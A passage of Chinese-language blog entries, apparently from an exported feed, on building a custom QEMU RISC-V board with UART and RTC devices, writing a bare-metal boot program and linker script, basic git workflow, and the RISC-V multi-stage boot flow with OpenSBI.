<p>.&#x2F;build.sh</p>
<p>.&#x2F;run.sh</p>
</blockquote>
<p><img src="/2024/06/02/qemu-riscv-add-flash-itr-gpio/image-20240603204507210.png" alt="image-20240603204507210"></p>
<h1 id="3-添加串口支持"><a href="#3-添加串口支持" class="headerlink" title="3.添加串口支持"></a>3.添加串口支持</h1><p>需要一些串口打印 进行调试</p>
<blockquote>
<p>include&#x2F;quard_star.h</p>
<p>枚举类型加上 串口信息 和 RTC</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_CLINT,</span><br><span class="line">    QUARD_STAR_PLIC,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_UART1,</span><br><span class="line">    QUARD_STAR_UART2,</span><br><span class="line">    QUARD_STAR_RTC,</span><br><span class="line">    QUARD_STAR_FLASH,</span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_UART0_IRQ = <span class="number">10</span>,  <span class="comment">//定义了串口中断号为10</span></span><br><span class="line">    QUARD_STAR_UART1_IRQ = <span class="number">11</span>,</span><br><span class="line">    QUARD_STAR_UART2_IRQ = <span class="number">12</span>,</span><br><span class="line">    QUARD_STAR_RTC_IRQ   = <span class="number">13</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>hw&#x2F;quard_star.c</p>
<p>配置基址以及大小</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BASE SIZE</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_CLINT] = &#123; <span class="number">0x02000000</span>,       <span class="number">0x10000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_PLIC]  = &#123; <span class="number">0x0C000000</span>,     <span class="number">0x4000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART1] = &#123; <span class="number">0x10001000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART2] = &#123; <span class="number">0x10002000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_RTC]   = &#123; <span class="number">0x10003000</span>,        <span class="number">0x1000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_FLASH] = &#123; <span class="number">0x20000000</span>,     <span class="number">0x2000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>配置RTC 以及 UART</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_rtc_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;    </span><br><span class="line">    QuardStarState *s = RISCV_VIRT_MACHINE(machine);</span><br><span class="line">    sysbus_create_simple(<span class="string">&quot;goldfish_rtc&quot;</span>, quard_star_memmap[QUARD_STAR_RTC].base,</span><br><span class="line">        qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_RTC_IRQ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*UART*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_serial_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemoryRegion *system_memory = get_system_memory();</span><br><span class="line">    QuardStarState *s = RISCV_VIRT_MACHINE(machine);</span><br><span class="line">    </span><br><span class="line">    serial_mm_init(system_memory, quard_star_memmap[QUARD_STAR_UART0].base,</span><br><span class="line">        <span class="number">0</span>, qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_UART0_IRQ), <span class="number">399193</span>,</span><br><span class="line">        serial_hd(<span class="number">0</span>), DEVICE_LITTLE_ENDIAN);</span><br><span class="line">    serial_mm_init(system_memory, quard_star_memmap[QUARD_STAR_UART1].base,</span><br><span class="line">        <span class="number">0</span>, qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_UART1_IRQ), <span class="number">399193</span>,</span><br><span class="line">        serial_hd(<span class="number">1</span>), DEVICE_LITTLE_ENDIAN);</span><br><span class="line">    serial_mm_init(system_memory, quard_star_memmap[QUARD_STAR_UART2].base,</span><br><span class="line">        <span class="number">0</span>, qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_UART2_IRQ), <span class="number">399193</span>,</span><br><span class="line">        serial_hd(<span class="number">2</span>), DEVICE_LITTLE_ENDIAN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>初始化各种配置 init</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quard_star_rtc_create(machine);</span><br><span class="line">quard_star_serial_create(machine);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>Kconfig</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config QUARD_STAR</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    select SERIAL</span><br><span class="line">    select PFLASH_CFI01</span><br><span class="line">    select RISCV_ACLINT</span><br><span class="line">    select RISCV_APLIC</span><br><span class="line">    select SIFIVE_PLIC </span><br><span class="line">    select GOLDFISH_RTC</span><br></pre></td></tr></table></figure>



<ul>
<li>测试</li>
<li>修改run.sh 映射monitor到控制台</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-monitor stdio \   <span class="comment">#映射monitor</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./build.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>



<p><img src="/2024/06/02/qemu-riscv-add-flash-itr-gpio/image-20240603224800293.png" alt="image-20240603224800293"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>git-操作基础</title>
    <url>/2024/06/05/git-%E6%93%8D%E4%BD%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="1-git"><a href="#1-git" class="headerlink" title="1.git"></a>1.git</h1><p>因为 riscv项目在分别在两台电脑上操作完成，特此记录一下使用操作</p>
<p>在另一台电脑上（wsl2 Ubuntu20.04）</p>
<ul>
<li>配置ssh key</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加到ssh代理</span></span><br><span class="line">eval &quot;$(ssh-agent -s)&quot;</span><br><span class="line">ssh-add ~/.ssh/id_rsa</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制密匙 并添加到github</span></span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>在wsl2 将项目与 git仓库关联</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add github git@github.com:liangzhouzz/riscv_project.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后就是 git add git commit等</span></span><br></pre></td></tr></table></figure>



<ul>
<li>合并分支</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到main</span></span><br><span class="line">git checkout main</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拉取最新更改</span></span><br><span class="line">git pull origin main</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">合并新分支</span></span><br><span class="line">git merge new-branch-name</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果有冲突 提示处理冲突文件</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;Resolved merge conflicts&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">推送合并后的分支</span></span><br><span class="line">git push origin main</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-3-测试串口打印</title>
    <url>/2024/06/04/riscv-3-%E6%B5%8B%E8%AF%95%E4%B8%B2%E5%8F%A3%E6%89%93%E5%8D%B0/</url>
    <content><![CDATA[<h1 id="1-start-s-位于flash的第一段代码"><a href="#1-start-s-位于flash的第一段代码" class="headerlink" title="1.start.s 位于flash的第一段代码"></a>1.start.s 位于flash的第一段代码</h1><p>maskrom中 的代码会引导程序到pflash的零地址  即 <code>0x20000000</code>，所以程序从这个地址开始。</p>
<ol>
<li>读取hard id </li>
<li>如果为0 就跳转_core0 执行打印</li>
<li>_core0 函数 往flash 0x20000000 一个一个写字母</li>
</ol>
<blockquote>
<p>start.c</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.section .text             //定义数据段名为.text</span><br><span class="line">	.globl _start              //定义全局符号_start</span><br><span class="line">	.type _start,@function     //_start为函数</span><br><span class="line"></span><br><span class="line">_start:                        //函数入口</span><br><span class="line">    csrr    a0, mhartid        //csr是riscv专有的内核私有寄存器，独立在12位地址</span><br><span class="line">                               //mhartid寄存是定义了内核的hart id，这里读取到a0寄存器里</span><br><span class="line">    li		t0,	0x0            //li是伪指令，加载立即数0到t0</span><br><span class="line">	beq		a0, t0, _core0     //比较a0和t0,相等则跳转到_core0地址处，否则向下执行</span><br><span class="line">_loop:                         //定义一个_loop符号</span><br><span class="line">	j		_loop              //跳转到_loop，此处形成循环，用意为如果当前cpu core不为</span><br><span class="line">                               //hart 0则循环等待，为hart 0则继续向下执行</span><br><span class="line">_core0:                        //定义一个core0才能执行到此处</span><br><span class="line">	li		t0,	0x100          //t0 = 0x100</span><br><span class="line">	slli	t0,	t0, 20         //t0 左移20位 t0 = 0x10000000</span><br><span class="line">	li		t1,	&#x27;H&#x27;            //t1 = &#x27;H&#x27; 字符的ASCII码值写入t1</span><br><span class="line">	sb		t1, 0(t0)          //s是store写入的意思，b是byte，这里指的是写入t1</span><br><span class="line">                               //的值到t0指向的地址，即为写入0x10000000这个寄存器</span><br><span class="line">                               //这个寄存器正是uart0的发送data寄存器，此时串口会输出&quot;H&quot;</span><br><span class="line">	li		t1,	&#x27;e&#x27;            //接下来都是重复内容</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;Q&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;u&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;S&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;t&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;b&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;!&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;\n&#x27;</span><br><span class="line">	sb		t1, 0(t0)          //到这里就会输出&quot;Hello Quard Star board!&quot;  </span><br><span class="line">	j		_loop              //完成后进入loop</span><br><span class="line"></span><br><span class="line">    .end                       //汇编文件结束符号</span><br></pre></td></tr></table></figure>





<h1 id="2-lds-链接文件"><a href="#2-lds-链接文件" class="headerlink" title="2.lds 链接文件"></a>2.lds 链接文件</h1><p>lds 将.s的代码 链接到flash处</p>
<blockquote>
<p>boot.lds</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OUTPUT_ARCH( &quot;riscv&quot; )  /*输出可执行文件平台*/</span><br><span class="line"></span><br><span class="line">ENTRY( _start )         /*程序入口函数*/</span><br><span class="line"></span><br><span class="line">MEMORY                  /*定义内存域*/</span><br><span class="line">&#123; </span><br><span class="line">    /*定义名为flash的内存域属性以及起始地址，大小等*/</span><br><span class="line">	flash (rxai!w) : ORIGIN = 0x20000000, LENGTH = 512k </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SECTIONS                /*定义段域*/</span><br><span class="line">&#123;</span><br><span class="line">  .text :               /*.text段域*/</span><br><span class="line">  &#123;</span><br><span class="line">    KEEP(*(.text))      /*将所有.text段链接在此域内，keep是保持防止优化，即无论如何都保留此段*/</span><br><span class="line">  &#125; &gt;flash              /*段域的地址(LMA和VMA相同)位于名为flash内存域*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>build.sh</p>
<p>这里交叉编译器使用<code>riscv64-unknown-elf-gcc</code> 用于编译面向RISC-V 64位架构的ELF（可执行和可链接格式）目标文件。这个前缀表示，你正在使用的是针对RISC-V架构未知操作系统（ELF）的GCC编译器。</p>
<ul>
<li>制作固件，我们的pflash为32M，因此flash固件比较为32M，我们生成一个32文件，空余位置暂时先填充0，这样就得到了fw.bin固件</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CROSS_PREFIX=riscv64-unknown-elf</span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/lowlevelboot&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/lowlevelboot</span><br><span class="line">fi  </span><br><span class="line">cd boot</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -x assembler-with-cpp -c start.s -o <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/start.o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -nostartfiles -T./boot.lds -Wl,-Map=<span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.map -Wl,--gc-sections <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/start.o -o <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.elf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用gnu工具生成原始的程序bin文件</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objcopy -O binary -S <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.elf <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.bin</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用gnu工具生成反汇编文件，方便调试分析（当然我们这个代码太简单，不是很需要）</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objdump --<span class="built_in">source</span> --demangle --disassemble --reloc --wide <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.elf &gt; <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.lst</span></span><br><span class="line"></span><br><span class="line">cd $SHELL_FOLDER/output/lowlevelboot</span><br><span class="line">rm -rf fw.bin</span><br><span class="line">dd of=fw.bin bs=1k count=32k if=/dev/zero</span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=0 if=lowlevel_fw.bin</span><br></pre></td></tr></table></figure>







<blockquote>
<p>run.sh</p>
<ul>
<li>加载固件运行qemu仿真，向之前run.sh脚本添加-drive if&#x3D;pflash的参数就可以将固件配置到模拟器的固件加载位置，根据之前qemu内的路径就可以加载执行固件内的代码。</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#-monitor stdio \</span></span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/fw.bin \</span></span><br><span class="line"><span class="language-bash">-nographic --parallel none</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>sudo .&#x2F;build.sh</p>
<p>sudo .&#x2F;run.sh</p>
</blockquote>
<p><img src="/2024/06/04/riscv-3-%E6%B5%8B%E8%AF%95%E4%B8%B2%E5%8F%A3%E6%89%93%E5%8D%B0/image-20240605202837030.png" alt="image-20240605202837030"></p>
<h1 id="3-问题"><a href="#3-问题" class="headerlink" title="3.问题"></a>3.问题</h1><blockquote>
<p>注意安装riscv64交叉编译环境的时候汇报这个错误，可能要指明使用的lib路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib -x assembler-with-cpp -c start.s -o <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/start.o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib</span></span><br></pre></td></tr></table></figure>


</blockquote>
<p><img src="/2024/06/04/riscv-3-%E6%B5%8B%E8%AF%95%E4%B8%B2%E5%8F%A3%E6%89%93%E5%8D%B0/image-20240604194042617.png" alt="image-20240604194042617"></p>
<blockquote>
<p>报错</p>
<p>.&#x2F;run.sh: 9: -drive: not found</p>
<p>原因是上面命令有注释然后命令断开了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/fw.bin \</span></span><br><span class="line"><span class="language-bash">-nographic --parallel none</span></span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-4-opensbi</title>
    <url>/2024/06/06/riscv-4-opensbi/</url>
    <content><![CDATA[<h1 id="1-riscv的多级启动引导流程介绍"><a href="#1-riscv的多级启动引导流程介绍" class="headerlink" title="1.riscv的多级启动引导流程介绍"></a>1.riscv的多级启动引导流程介绍</h1><p>之前的步骤都是板子的一些外设添加以及，上一节写了个简单的固件程序，目前已经实现了板子的cpu，MROM，SRAM，FLASH，DDR，UART和RTC</p>
<img src="/2024/06/06/riscv-4-opensbi/image-20240606105450786.png" alt="image-20240606105450786" style="zoom: 67%;">



<blockquote>
<p>参考：</p>
<ol>
<li><a href="https://blog.csdn.net/flyfish1986/article/details/131043405">RISC-V体系结构的U-Boot引导过程_riscv uboot-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/cfas/p/16880724.html">RISC-V启动引导流程 spec - 方东信 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://github.com/wangzhou/notes/blob/master/%E5%A4%9A%E6%A0%B8%E5%90%AF%E5%8A%A8%E5%9F%BA%E6%9C%AC%E9%80%BB%E8%BE%91">notes&#x2F;多核启动基本逻辑 at master · wangzhou&#x2F;notes (github.com)</a></li>
</ol>
</blockquote>
<p><strong>三种主要的操作模式</strong>，riscv 规范定义了三种主要的操作模式</p>
<ol>
<li>U模式（用户模式），运行用户程序的模式，权限级别最低。不能直接访问I&#x2F;O或特权指令或内核内存或其他进程。</li>
<li>S模式（管理模式），大多数Linux内核或其他O&#x2F;S运行的模式。通过I&#x2F;O remap函数访问最特权的指令和I&#x2F;O控制。内存管理单元可能打开或关闭。</li>
<li>M模式（机器模式），机器模式:裸机程序&#x2F;第一阶段引导加载程序和FSBL（First Stage Bootloader ）在此模式下运行。FSBL以固件的形式存在</li>
</ol>
<blockquote>
<p>固件：固件（Firmware）是一种嵌入在硬件设备中的软件，用于控制硬件的功能和操作。<strong>它介于硬件和高级软件（如操作系统和应用程序）之间，提供基本的硬件抽象和控制。</strong> 通常存在ROM或者EEPROM，例如BIOS 或者 UEFI等，</p>
</blockquote>
<p><strong>uboot</strong> 可以运行在M模式或者 S模式下， 取决于它是否在SBI的固件初始化之前运行。</p>
<ol>
<li><code>SBI</code>Supervisor Binary Interface 是 S模式 和SEE之间的<strong>调用约定&#x2F;接口。</strong>SEE&#96;Supervisor Execution Environment  S执行环境 ，其<strong>调用风格就像System call</strong>一样。OpenSBI是一个SBI实现，可以在不同的模式下与U-Boot一起使用。</li>
<li><code>opensbi</code> RISC-V Open Source Supervisor Binary Interface</li>
<li>如下图，ABI 是 应用与 S模式之间的接口约定， SBI 是 S模式与 M模式之间的接口约定</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606114347807.png" alt="image-20240606114347807"></p>
<p><strong>多级启动流程</strong></p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606115629524.png" alt="image-20240606115629524"></p>
<ul>
<li>实线箭头代表加载的操作</li>
<li>虚线箭头代表跳转操作</li>
</ul>
<p><strong>流程</strong>：</p>
<ol>
<li>ROM上的代码负责对电源，时钟进行初始化设置，并且将loader的代码加载到SRAM上并跳转执行LOADER    —- 对应到<code>riscv_setup_rom_reset_vec</code></li>
<li>LOADER 初始化DDR（其实也是一种ram），然后加载opensbi 固件到ddr，也可以直接跳转到bootloader执行</li>
<li>最后bootloader会加载os 并执行</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606143633584.png" alt="流程引导的每个模式"></p>
<ol>
<li>每个步骤运行在哪个模式下，</li>
<li>zsbl<code>Zero Stage Boot Loader</code>，运行在M模式下，事实上我们在qemu中是通过drive 将固件直接加载到了flash的地方，所以rom上不需要执行加载的操作</li>
<li>fsbl，运行在M模式下，这里需要加载 opensbi固件，加载设备树，然后跳转opensbi执行</li>
<li>opensbi，执行在M模式下</li>
<li>跳转执行uboot执行在S模式下</li>
<li>os 运行在 S模式下</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606152715952.png" alt="image-20240606152715952"></p>
<p><strong>内存布局</strong></p>
<blockquote>
<p>qemu模拟的riscv中，多核启动的流程都是先多个核竞争一个主核，由主核对共享资源进行初始化，然后其余从核进行自身的初始化</p>
<p><code>riscv_setup_rom_reset_vec</code> 用于设置 RISC-V 处理器的复位向量地址。复位向量是处理器在复位（重启）后执行的第一条指令的地址。该函数通常用于配置处理器的启动过程，确保处理器在复位后从正确的地址开始执行代码。</p>
<p><strong>fw_dynamic_info</strong> 结构体，这个结构体 包含了下一个阶段程序启动的地址，魔数，下一阶段CPU位于 S模式，初始化完毕后又调用<code>rom_add_blob_fixed_as</code>函数将<code>fw_dynamic_info</code>拷贝到rom的<code>reset_vec</code>之后，用于下一阶段的启动</p>
</blockquote>
<p>此时内存的布局是这样的：</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606151519375.png" alt="image-20240606151519375"></p>
<p> 上一章节，将启动固件加载在<strong>flash</strong>后的内存布局：</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606152341573.png" alt="image-20240606152341573"></p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606153011137.png" alt="image-20240606153011137"></p>
<h1 id="2-Opensbi介绍"><a href="#2-Opensbi介绍" class="headerlink" title="2.Opensbi介绍"></a>2.Opensbi介绍</h1><p><code>SBI</code>指的是 Supervisor Binary Interface，<strong>运行在 M模式下的程序，操作系统（S模式）通过SBI 来调用M模式的硬件资源 相当于上层系统运行时的系统调用</strong> opensbi是一种开源sbi的实现 </p>
<ul>
<li><code>FW_PAYLOAD</code> ：下一引导阶段被作为 payload 打包进来，通常是 U-Boot 或 Linux。这是兼容 Linux 的 RISC-V 硬件所使用的默认 firmware 。</li>
<li><code>FW_JUMP</code> ：不直接包含下一个阶段的代码，跳转到一个固定地址，该地址上需存有下一个加载器。QEMU 的早期版本曾经使用过它。</li>
<li><code>FW_DYNAMIC</code> ：带有动态信息的固件，根据前一个阶段传入的信息加载下一个阶段。通常是 U-Boot SPL 使用它。现在 QEMU 默认使用 FW_DYNAMIC。</li>
</ul>
<blockquote>
<p>opensbi源码下载：<a href="https://github.com/riscv-software-src/opensbi/releases">Releases · riscv-software-src&#x2F;opensbi (github.com)</a></p>
<p>下载1.2版本。</p>
<p>当前版本opensbi开发者倾向于不要让ic设计尚加入太多的板级支持代码，因此opensbi本身也需要加载一份设备树文件，<strong>opensbi通过解析设备树文件了解soc内部的硬件结构</strong>，进而使用标准的驱动代码对其进行配置使用。</p>
</blockquote>
<p>因此我们目前可以确认：</p>
<ol>
<li>首先系统从MROM 启动– BL0</li>
<li>然后跳转到 flash 的首地址 执行上一节编写的 lowlevelboot 程序 – BL1</li>
<li>然后将 flash 上的 opensbi程序和 所需要的设备树资源文件加载到ddr上并跳转执行 – BL2</li>
</ol>
<blockquote>
<p><a href="https://quard-star-tutorial.readthedocs.io/zh-cn/latest/ch5-2.html">基于qemu-riscv从0开始构建嵌入式linux系统ch5-2. 什么是多级BootLoader与opensbi(下) — 主页 (quard-star-tutorial.readthedocs.io)</a></p>
<p>设备树：设备树是从linux内核中广泛使用的一种设备描述文件，可以简化驱动代码的编写并提高驱动代码的复用率移植性，因此逐渐扩展到各个嵌入式平台级代码项目中</p>
</blockquote>
<p>opensbi中<code>fw_base.S</code>汇编文件正是opensbi的启动所在</p>
<ol>
<li>.<code>entry</code>段<code>_start</code>符号即为链接脚本中第一个代码段，上级loader程序加载完成后自然跳转到该地址指令执行。</li>
<li>首先启动代码进行判断非boot核心跳转<code>_wait_for_boot_hart</code>等待，boot核心先进行一次代码<code>_relocate</code>，可以发现如果<code>opensbi</code>如果不在自己的链接地址内运行，则会实现自身代码的拷贝到目标<code>ram</code>上运行，因此可以以类似<code>spl</code>的方式从<code>flash</code>中启动。当然我们因为已经使用了自己编写的loader程序，这段<code>_relocate</code>不会执行，</li>
